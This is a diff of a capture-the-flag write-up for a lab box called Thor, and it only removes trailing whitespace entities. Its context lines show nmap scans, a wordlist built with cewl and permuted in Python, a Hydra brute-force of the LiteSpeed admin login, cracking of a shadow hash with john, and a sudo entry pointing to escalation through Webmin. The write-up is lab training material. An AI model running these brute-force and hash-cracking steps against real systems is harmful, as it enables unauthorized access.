@@ -17,7 +17,7 @@ PORT      STATE SERVICE
 10000/tcp open  snet-sensor-mgmt
 ```
 
-Did a detailed scan on the open web ports.&#x20;
+Did a detailed scan on the open web ports.
 
 ```
 $ sudo nmap -p 80,7080,10000 -sC -sV --min-rate 3000 -Pn 192.168.201.208
@@ -150,7 +150,7 @@ At the bottom of the page, there was some contact details:
 
 <figure><img src="../../../.gitbook/assets/image (1539).png" alt=""><figcaption></figcaption></figure>
 
-The box was named Thor, so it makes sense that there would be something 'Thor' related. From the earlier `nmap` scan, we know that port 80 is running using Litespeed. Port 7080 is the LiteSpeed admin console, likely operated by this Jane Foster.&#x20;
+The box was named Thor, so it makes sense that there would be something 'Thor' related. From the earlier `nmap` scan, we know that port 80 is running using Litespeed. Port 7080 is the LiteSpeed admin console, likely operated by this Jane Foster.
 
 Port 7080 reveals a login page:
 
@@ -170,13 +170,13 @@ Openlitespeed WebServer 1.7.8 - Command Injection (Authent | multiple/webapps/49
 ----------------------------------------------------------- ---------------------------------
 ```
 
-One of which is an RCE exploit, but it requires credentials. Weak credentials don't work here, so we need to get crafty. We know that 'Jane Foster' is the one operating this webpage. So let's create a custom wordlist present.&#x20;
+One of which is an RCE exploit, but it requires credentials. Weak credentials don't work here, so we need to get crafty. We know that 'Jane Foster' is the one operating this webpage. So let's create a custom wordlist present.
 
 ```
 $ cewl http://192.168.201.208 -d 5 --with-numbers > wordlist
 ```
 
-I tried to use Hydra to brute force this, but it didn't work either. I took a hint and it told me to keep brute forcing, so in this case we can try the permutation of words within our `wordlist` file.&#x20;
+I tried to use Hydra to brute force this, but it didn't work either. I took a hint and it told me to keep brute forcing, so in this case we can try the permutation of words within our `wordlist` file.
 
 ```python
 import itertools
@@ -192,7 +192,7 @@ for combination in itertools.permutations(wordlist, 2):
     print(permutation)
 ```
 
-This would combine two of the words together. Then, we can brute force again with Hydra.&#x20;
+This would combine two of the words together. Then, we can brute force again with Hydra.
 
 ```
 $ hydra -l admin -P permutated.txt -s 7080 -t 64 192.168.201.208 https-post-form "/login.php:userid=admin&pass=^PASS^:Invalid credential" -v
@@ -227,7 +227,7 @@ thor:$6$l2ThCEsvmrzmkKIA$FWtAb1SsYFqAXA96Ze4uGTHtPV9HNi7ShAgoTet1gx.HvkEFePp.Bk/
 ```
 {% endcode %}
 
-We can try to crack the hashes alone using `john` for these users. The hash for `thor` can be cracked while the one for `root` cannot.&#x20;
+We can try to crack the hashes alone using `john` for these users. The hash for `thor` can be cracked while the one for `root` cannot.
 
 ```
 $ john --show hashes                                     
@@ -254,7 +254,7 @@ User thor may run the following commands on lite:
     (root) NOPASSWD: /usr/bin/systemctl restart webmin
 ```
 
-I almost forgot there was a Webmin instance.&#x20;
+I almost forgot there was a Webmin instance.
 
 ```
 thor@Lite:~$ ps -elf | grep webmin
